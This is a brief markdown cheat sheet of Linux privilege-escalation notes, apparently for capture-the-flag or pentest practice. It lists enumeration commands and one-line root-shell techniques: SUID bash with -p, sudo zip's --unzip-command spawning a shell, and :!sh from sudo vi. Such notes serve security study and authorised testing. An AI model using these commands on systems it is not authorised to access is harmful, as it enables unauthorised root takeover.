---
icon: linux
---

# Linux

* `sudo -l` to see what sudo can do
* [gtfobins.github.io](https://gtfobins.github.io/)
* linPEAS
* get suid binaries: `find / -perm -u=s -type f 2>/dev/null`
  * launching shell from suid binary, use `exec /bin/sh -p` to keep effective uid from being reset
    * in the case of one machine, there was a binary `.suid_bash`, the command `./.suid_bash -p` gave a root shell
* weird zip command if for some reason you have sudo zip privs: `sudo zip test.zip test.txt -T --unzip-command="sh -c /bin/bash"` -T tests the integrity of the zip, then --unzip-command specifies the command to unzip the file, so it uses that in the integrity check
* check sudo environment variables
* from sudo vi - `:!sh` to launch shell
* check ports for nfs `rpcinfo -p`
* checking strings in files
  * `strings [file]`
    * try `-e l` also
